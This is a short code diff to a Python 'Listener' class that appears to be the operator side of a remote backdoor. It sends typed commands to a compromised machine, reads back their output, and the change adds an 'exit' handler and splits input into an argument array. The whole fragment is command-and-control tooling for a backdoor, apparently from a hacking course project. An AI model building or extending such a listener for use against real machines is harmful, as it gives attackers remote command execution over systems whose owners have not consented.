@@ -31,12 +31,18 @@ class Listener:
     # Send command remotely and receives it output
     def execute_remotely(self, command):
         self.reliable_send(command)  # Sending command to backdoor
+        # Reverse command exit
+        if command[0] == 'exit':
+            self.connection.close()
+            exit()
+
         return self.reliable_receive()  # Receiving output from backdoor
 
     # Take input
     def run(self):
         while True:
             command = raw_input(">> ")
+            command = command.split(" ")  # Take command as an array
             result = self.execute_remotely(command)
             print(result)
 
